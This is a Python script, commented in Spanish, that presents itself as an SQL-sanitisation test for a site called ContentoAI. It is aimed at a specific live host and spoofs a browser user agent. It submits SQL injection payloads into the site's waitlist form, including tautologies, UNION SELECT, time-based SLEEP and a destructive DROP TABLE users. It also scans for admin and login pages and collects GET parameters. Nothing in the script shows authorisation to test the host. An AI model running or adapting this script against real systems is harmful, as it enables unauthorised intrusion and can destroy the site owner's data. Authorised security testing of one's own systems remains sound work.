#!/usr/bin/env python3
"""
Prueba de sanitización SQL para ContentoAI.
Envía payloads de inyección SQL en formularios identificados.
Detecta errores de base de datos en respuestas.
"""
import requests
import re
import sys
from datetime import datetime
import time

BASE_URL = "https://contentoai.cenarbe.com"
SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
})

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {msg}")
    sys.stdout.flush()

def detect_sql_errors(text):
    """Detecta mensajes de error de SQL en la respuesta."""
    patterns = [
        r"SQLSTATE\[\d+\]",
        r"Unknown column",
        r"Table '[^']+' doesn't exist",
        r"You have an error in your SQL syntax",
        r"Column not found",
        r"MySQL server version",
        r"PostgreSQL.*ERROR",
        r"Warning.*mysql",
        r"Fatal error.*SQL",
        r"Unclosed quotation mark",
        r"Integrity constraint violation",
        r"Duplicate entry",
        r"Foreign key constraint fails",
        r"Database error",
        r"SQL error",
        r"mysqli",
        r"PDOException"
    ]
    for pattern in patterns:
        if re.search(pattern, text, re.IGNORECASE):
            return True, pattern
    return False, None

def find_forms(html):
    """Extrae formularios del HTML (simplificado)."""
    forms = []
    # Buscar etiquetas <form>
    form_matches = re.findall(r'(<form[^>]*>.*?</form>)', html, re.DOTALL)
    for form_html in form_matches:
        # Extraer acción (action)
        action_match = re.search(r'action="([^"]*)"', form_html)
        action = action_match.group(1) if action_match else ""
        # Extraer método (method)
        method_match = re.search(r'method="([^"]*)"', form_html, re.IGNORECASE)
        method = method_match.group(1).upper() if method_match else "GET"
        # Extraer campos input, select, textarea
        inputs = re.findall(r'<(input|select|textarea)[^>]*>', form_html, re.IGNORECASE)
        fields = []
        for tag in inputs:
            # Extraer nombre (name)
            name_match = re.search(r'name="([^"]*)"', tag)
            if name_match:
                fields.append(name_match.group(1))
        forms.append({
            "html": form_html,
            "action": action,
            "method": method,
            "fields": fields
        })
    return forms

def test_waitlist_form():
    """Prueba el formulario de lista de espera con payloads SQL."""
    log("=== Probando formulario de lista de espera ===")
    # Obtener página principal
    resp = SESSION.get(BASE_URL)
    if resp.status_code != 200:
        log(f"ERROR: GET {BASE_URL} status {resp.status_code}")
        return
    
    forms = find_forms(resp.text)
    waitlist_form = None
    for form in forms:
        if "waitlist" in form["html"].lower():
            waitlist_form = form
            break
    
    if not waitlist_form:
        log("No se encontró formulario de lista de espera")
        return
    
    log(f"Formulario encontrado: acción={waitlist_form['action']}, método={waitlist_form['method']}, campos={waitlist_form['fields']}")
    
    # Payloads de inyección SQL básicos
    sql_payloads = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "' UNION SELECT NULL, NULL, NULL --",
        "' AND SLEEP(5) --",
        "' OR IF(1=1, SLEEP(2), 0) --"
    ]
    
    # Determinar URL de envío
    action_url = waitlist_form['action']
    if not action_url:
        action_url = BASE_URL  # Por defecto misma página
    elif not action_url.startswith('http'):
        if action_url.startswith('/'):
            action_url = BASE_URL + action_url
        else:
            action_url = BASE_URL + '/' + action_url
    
    # Para cada payload, enviar formulario
    for payload in sql_payloads:
        log(f"  Probando payload: {payload}")
        # Construir datos con payload en cada campo
        data = {}
        for field in waitlist_form['fields']:
            if field.lower() in ['email', 'e-mail']:
                data[field] = f"test{payload.replace(' ', '_')}@example.com"
            else:
                data[field] = payload
        
        # Enviar solicitud
        if waitlist_form['method'] == 'POST':
            resp = SESSION.post(action_url, data=data)
        else:
            resp = SESSION.get(action_url, params=data)
        
        # Verificar errores SQL
        has_sql, pattern = detect_sql_errors(resp.text)
        if has_sql:
            log(f"    !! POSIBLE VULNERABILIDAD SQL DETECTADA: {pattern}")
            log(f"       Payload: {payload}")
            # Registrar fragmento de error
            error_snippet = re.search(r'<div class="error">(.*?)</div>', resp.text, re.DOTALL)
            if error_snippet:
                log(f"       Error: {error_snippet.group(1)[:200]}")
        else:
            log(f"    ✓ Sin errores SQL visibles")
        
        time.sleep(1)  # Evitar rate limiting

def test_admin_endpoints():
    """Prueba endpoints de administración comunes."""
    log("=== Probando endpoints de administración ===")
    endpoints = [
        "/admin",
        "/admin/login.php",
        "/admin/login",
        "/login",
        "/signin",
        "/wp-admin",
        "/administrator",
        "/backend",
        "/dashboard"
    ]
    for endpoint in endpoints:
        url = BASE_URL + endpoint
        log(f"  Probando {url}")
        resp = SESSION.get(url, allow_redirects=False)
        if resp.status_code == 200:
            log(f"    ✓ Existe (código {resp.status_code})")
            # Buscar formularios de login
            forms = find_forms(resp.text)
            for form in forms:
                if any(field in ['username', 'user', 'email', 'password'] for field in form['fields']):
                    log(f"      Formulario de login encontrado: campos {form['fields']}")
                    # Podríamos probar inyección SQL aquí, pero omitimos por ahora
        elif resp.status_code in [301, 302, 307, 308]:
            log(f"    → Redirección (código {resp.status_code})")
        else:
            log(f"    ✗ No accesible (código {resp.status_code})")
        time.sleep(0.5)

def test_parameter_injection():
    """Prueba inyección SQL en parámetros GET (si existen)."""
    log("=== Probando inyección en parámetros GET ===")
    # Buscar enlaces con parámetros en la página principal
    resp = SESSION.get(BASE_URL)
    param_links = re.findall(r'href="[^"]*\?([^"]+)"', resp.text)
    param_names = set()
    for query in param_links:
        params = query.split('&')
        for param in params:
            if '=' in param:
                name = param.split('=')[0]
                param_names.add(name)
    
    if not param_names:
        log("  No se encontraron parámetros GET en enlaces")
        return
    
    log(f"  Parámetros encontrados: {list(param_names)[:5]}")
    # Tomar una página de ejemplo que tenga parámetros (ej. ?id=...)
    # Usar bicicletas.php?id=... (pero eso es de Cenarbe, no ContentoAI)
    # Por simplicidad, omitimos pruebas profundas.
    log("  (Omitiendo pruebas profundas por tiempo)")

def main():
    log("Iniciando pruebas de sanitización SQL para ContentoAI")
    log("=" * 60)
    
    # 1. Formulario de lista de espera
    test_waitlist_form()
    
    # 2. Endpoints de administración
    test_admin_endpoints()
    
    # 3. Parámetros GET (opcional)
    test_parameter_injection()
    
    log("Pruebas completadas.")
    log("NOTA: Estas pruebas son básicas. Una auditoría completa requiere más payloads y análisis.")

if __name__ == "__main__":
    main()